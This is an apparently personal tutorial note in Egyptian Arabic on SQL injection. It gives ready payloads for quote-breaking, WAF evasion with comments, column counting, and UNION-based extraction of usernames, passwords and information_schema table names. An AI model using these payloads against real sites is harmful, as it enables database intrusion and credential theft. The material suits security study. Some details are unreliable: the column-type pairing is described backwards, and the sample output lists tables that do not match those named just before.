```sql
select * from books where year=2020;
```

```sql
select * from books where year=2020 or year=2017;
```

##### لو فى كذا كونديشن - AND هى اللى بتتنفذ الاول وبعد كده OR حتى لو OR مكتوبه الاول 
```sql
select * from books where year=2020 AND sales=1000;
```


كل داتا بيز فيها datatype مختلفة - كل datatype بيتعملها presentation بطريقة مختلفة.

| **ارقام**                                                                                                                          | **مش ارقام**                                                                                    |
| ---------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------- |
| بتكون بنسبة كبيرة من غير qout                                                                                                      | هنا لازم يكون فى quote                                                                          |
| يعنى زى الامثلة اللى مكتوبه فى الكويري فوق                                                                                         | `select * from books where author='islam';`                                                     |
| وده هيخلى اى عملية حسابية هتتكتب جوا الكود تتنفذ بالفعل<br>`select * from books where year=2020-20;`<br>الكويري دى هيخلى year=2000 | فى MariaDB - MySql<br>لو جينا عند الاسترينج وكتبناه كده <br>`'is' 'lam'`<br>هيعملها concatenate |
| هنا هنستفاد بالموضوع ده واحنا بنتيست ع الثغرة                                                                                      | فى PostgreSQL - Oracle<br>عشان يتعملها concatenate بنعمل كده <br>`'is'`\|\|`'lam'`              |
|                                                                                                                                    | فى SQLserver - microsoft sql server<br>بتكون كده `'is'+'lam'`                                   |

كل اللى فى الجدول ده بنجربه علشان نعرف هل فى sql injection ولا لاء 
وبردو هنعرف نوع الداتا بيز من خلال طريقة الــ concatenate اللى هتتقبل 
 
 منجحش الكلام ده ؟ -- يبقى هنتجه الى AND, OR
 بس نخلى بالنا واحنا بنتعامل مع الاسترينج ان هيكون فى سينجل او دوبل كوت فى الاخر 
 ف هنا لازم نستخدم الكومنت او نظبط الكويرى بتاعتنا ونحاول نقفل السينجل او الدوبل كوت اللى فى الاخر 
 كده مثلا 
```sql
--        ' AND 1='1
 select * from books where author='islam' AND 1='1';
```
هنا حطينا سينجل كوت قبل الواحد الاخير عشان يقفل الكوت بتاعت الكويري الاساسيه 
ودى اللى بنعتمد عليها فى الاول علشان لو الكويرى معقده وليها تكمله منعملش كومنت لحاجه احنا محتاجنها علشان الكويري تشتغل بدون اخطاء
 
والكومنت فى MySql 


Single Line: `-- xxxxxxxxx` 

Multiline: `/* xxxxxxxxxxxxxx */` 

 وفى بعض الاوقات بنستخدم Multiline Comment  على انه Space `/**/` علشان نعدى من WAF

---
### ازاى نــ Exploit SQL injection
### استخدام UNION
اللى لازم نعرفه عن union قبل ما نستخدمها هى ان 
1. لازم عدد الأعمدة في الاستعلام الأول (قبل UNION) يساوي عدد الأعمدة في الاستعلام الثاني. لو مش متساوي، الاستعلام هيفشل.
2. لازم أنواع البيانات تكون متوافقة (مثلاً title و username لازم يكونوا نصوص لو الاستعلام هيشتغل).

### مثال :-
**هنفترض إن فيه موقع فيه حقل بحث**:
- لما بتكتب كلمة في البحث (مثلاً search_term)، الموقع بيعمل استعلام زي:
```sql
SELECT title, 'Book' AS item_type FROM Books WHERE title LIKE '%search_term%';
```

هنجرب نستخدم union 
```sql
search_term' UNION SELECT username, password FROM users --
```
ف هنا الكويري هتتحول لكده لو فعلا مكان السيرش ده فيه ثغره 
```sql
SELECT title, 'Book' AS item_type FROM Books WHERE title LIKE '%search_term%' 
UNION 
SELECT username, password FROM users --
```
وبردو الكويرى مش هتشتغل اللا لو نوع الداتا اللى فى username نفس نوع الداتا اللى فى item_type
و نوع الداتا اللى فى  password نفس نوع الداتا اللى فى title

### تغير نوع الداتا 
طيب ولو فرضنا ان نوع الداتا فى password معمول INT 
ممكن نعمل حاجه زى كده ونحول نوع الداتا اللى موجود علشان الكويري تتنفذ
```sql
' UNION SELECT username, CAST(password AS CHAR) FROM users --
```

---
### معرفة عدد الاعمده
#### 1.  **طريقة ORDER BY**:

- **الفكرة**:
    - أمر ORDER BY بيُستخدم لترتيب النتايج بناءً على عمود معين. لو حاولت تستخدم ORDER BY برقم عمود أكبر من عدد الأعمدة الموجودة في الاستعلام، قاعدة البيانات هترجع خطأ.
    - بتزوّد الرقم تدريجيًا لحد ما تلاقي الرقم اللي يسبب خطأ، وبالتالي تعرف إن عدد الأعمدة هو الرقم اللي كان شغال قبل الخطأ.
    - زى كده `' ORDER BY 1 --` // `' ORDER BY 2 --` // `' ORDER BY 3 --` 

#### 2. **طريقة UNION SELECT مع قيم وهمية**:

- **الفكرة**:
    - تحقن استعلام UNION SELECT مع عدد أعمدة زيادة تدريجيًا، وتستخدم قيم وهمية (زي 1, 2, 3, إلخ) عشان تتأكد إن الاستعلام بيشتغل.
    - لو عدد الأعمدة صح، الاستعلام هينجح وهيظهر نتايج. لو العدد غلط، هيحصل خطأ أو مافيش نتايج.

`' UNION SELECT 1 --` 
لو فشل هنجرب
`' UNION SELECT 1, 2 --` 
 

ولو عرفت إن الأعمدة بتتعامل مع نصوص (strings) 
جرب تستخدم قيم زي 'test1', 'test2'  
بدل الأرقام وهكذا لغاية ما يطلعلنا قيمة وبكده نكون عرفنا عدد الاعمده 


---

### معرفة اسامى الجداول واسامى الاعمده:
عندنا حاجه اسمها #information_schema دى قاعدة بيانات افتراضية موجودة في أنظمة إدارة قواعد البيانات
بيكون فيها بيانات كتير زى جميع اسامى ( الجداول - الداتابيز - الاعمده اللى جوا الجداول )

واللى يهمنا فى الموضوع ده هو جدولين فى الداتابيز دى 

الاول وهو information_schema.tables 
والثانى information_schema.columns 


بعد ما عرفنا عدد الاعمده بالطريقة اللى فوق هنبتدى نشوف الاسامى بتاعة جداول الداتا بيز اللى احنا فيها 
ولازم الكويرى اللى هنحطها كــ بيلود تكون بنفس عدد الاعمده اللى موجوده فى الاستعلام الاساسي بتاع الموقع 

والكويرى هتكون كالاتى 
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE();
``` 

الجزء ده table_schema = DATABASE هو اللى بيحددلنا انه يبحث فى نفس الداتا بيز اللى احنا فيها 

هي اصلا الـ information_schema دى قاعدة بيانات الجداول اللى فيها من ضمنها جدول
اسمه tables وده اللى بيكون متجمع فيه كل الجداول اللى فى كل الداتا بيز اللى على السيرفر   
وده بندخله عن طريق الجزء ده information_schema.tables 
وبعد كده بنحدد ان العمود اللى اسمه table_schema واللى هو بيبقى فى اسماء الداتا بيز 
يعرضلنا فقط اسامى الجداول اللى فى الداتا بيز الحاليه.

لازم بقا ندمج الكويرى دى بعد معرفة عدد الاعمدة اللى موجوده فى الاستعلام الاساسى 
وليكن مثلا 3 اعمده .. يبقى paylod هتكون كده 

```sql
search_term' UNION SELECT table_name, 'test1', 'test2' FROM information_schema.tables WHERE table_schema = DATABASE() --
```

لو قاعدة البيانات الحالية فيها الجداول Books, employees, user_system 
النتيجة هتكون شكلها كده:
```
Book        | test1 | test2
employees   | test1 | test2
user_system | test1 | test2
orders      | test1 | test2
```

